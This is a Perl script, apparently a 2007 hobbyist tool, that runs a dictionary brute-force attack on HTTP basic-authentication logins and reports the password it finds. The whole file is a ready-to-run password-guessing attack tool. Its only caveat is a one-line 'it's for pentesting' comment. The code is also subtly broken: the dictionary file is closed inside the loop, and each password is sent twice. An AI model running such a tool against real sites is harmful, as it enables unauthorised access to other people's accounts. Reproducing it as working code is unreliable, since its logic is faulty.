#!/usr/bin/perl
###
#
# brute password crackalacker.  useful for anything that uses .htaccess
# or other basic authentication methods.
#
# don't use it for anything stupid.  it's for pentesting.
# - nwo
#
# 11/2/2007
#
###

use LWP::UserAgent;

sub usage() {
  $progname = $0;
  print "+--- created by nwo ---+\n";
  print "$progname (url) (user) (dictionary file)\n";
  print "\n";
  exit(0);
}

sub auth() {
  local($pw) = @_;
  $ua = LWP::UserAgent->new;
  $req = HTTP::Request->new(GET => "$url");
  $req->authorization_basic($user, $pw);
  @data = $ua->request($req)->as_string;
  foreach $line (@data) {
    if($line =~ /401/) {
      return "0";
    } else {
      return "1";
    }
  }
}
$url = $ARGV[0];
$user = $ARGV[1];
$dict = $ARGV[2];
if($dict eq "") {
  $dict = "D8.DIC";
}
if($user eq "") { &usage; }

open(D, "$dict") || die "$!";
while(<D>) {
  chomp($line = $_);
  print "Trying $line....";
  if((&auth($line)) eq "0") {
    print "failed.  Next..\n";
    next;
  }
  if((&auth($line)) eq "1") {
    print "success!  Password is $line\n";
    exit(0);
  }
close(D);
}

